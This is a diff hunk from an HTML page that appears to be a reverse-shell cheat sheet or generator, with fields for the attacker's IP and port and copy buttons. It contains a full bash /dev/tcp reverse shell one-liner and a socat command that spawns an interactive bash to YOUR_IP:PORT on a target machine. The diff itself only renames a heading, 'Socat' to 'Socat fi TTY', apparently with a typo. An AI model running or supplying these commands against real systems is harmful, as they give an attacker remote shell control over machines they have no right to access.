@@ -148,7 +148,7 @@ Your Port: <input type="text" id="PORT" placeholder="desired port" value="">
 <div id="to-copy-bash" class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">bash -i &gt;&amp; /dev/tcp/YOUR_IP/PORT 0&gt;&amp;<span style="color:#ae81ff">1</span>
 </code></pre></div>
 <button onClick="CopyToClipboard('to-copy-bash')">Copy</button>
-<h2 id="socat">Socat</h2>
+<h2 id="socat">Socat fi TTY</h2>
 <p> </p>
 <h6>On the remote target</h6>
 <div id="to-copy-socat-remote" class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:YOUR_IP:PORT
